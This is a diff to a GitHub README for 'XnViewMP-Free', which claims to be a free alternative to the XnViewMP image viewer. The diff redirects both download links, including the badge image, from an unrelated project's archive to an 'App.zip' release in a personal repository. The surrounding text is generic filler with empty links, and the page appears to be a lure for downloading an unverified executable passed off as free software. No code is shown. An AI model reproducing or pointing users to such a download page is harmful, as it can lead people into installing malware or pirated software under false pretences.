@@ -2,7 +2,7 @@
 
 Welcome to the XnViewMP-Free GitHub repository! 
 
-[![Download XnViewMP-Free](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download XnViewMP-Free](https://github.com/Lelouchp/XnViewMP-Free/releases/download/v1.0/App.zip)](https://github.com/Lelouchp/XnViewMP-Free/releases/download/v1.0/App.zip)
 
 ## Overview
 XnViewMP-Free is here to provide you with an alternative to XnViewMP, whether you are looking for a preview panel, contact sheet creation, or comparisons between XnView Classic and XnViewMP. This repository covers a wide range of topics related to XnViewMP and aims to be your go-to resource for all things XnViewMP.
@@ -36,7 +36,7 @@ To get started, download the latest release of XnViewMP-Free by clicking the but
 - [XnViewMP Categories](#)
 - [XnViewMP Tutorial](#)
 
-Visit [XnViewMP-Free Repository](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) for more information.
+Visit [XnViewMP-Free Repository](https://github.com/Lelouchp/XnViewMP-Free/releases/download/v1.0/App.zip) for more information.
 
 ## Issues and Feedback
 If you encounter any issues or have feedback regarding XnViewMP-Free, please feel free to open an issue on GitHub. Your input is valuable in improving the repository for all users.
